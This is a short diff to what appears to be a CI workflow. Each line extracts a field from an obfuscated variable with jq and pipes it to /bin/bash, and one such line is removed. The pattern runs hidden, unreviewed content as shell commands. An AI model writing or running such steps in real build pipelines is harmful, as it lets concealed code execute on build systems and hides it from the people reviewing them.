@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$nam6" | jq -r .ewr98 | /bin/bash
           echo $df60 | jq -r .qjkke3 | /bin/bash
           printf '%s' "$fpwwq3" | jq -r .drvn7770 | /bin/bash
-          printf '%s' "$smkij52" | jq -r .req0 | /bin/bash
           echo $dlogz170 | jq -r .dhc52891 | /bin/bash
           echo $g2483 | jq -r .cl1 | /bin/bash
           printf '%s' "$vid887" | jq -r .wqqg66 | /bin/bash
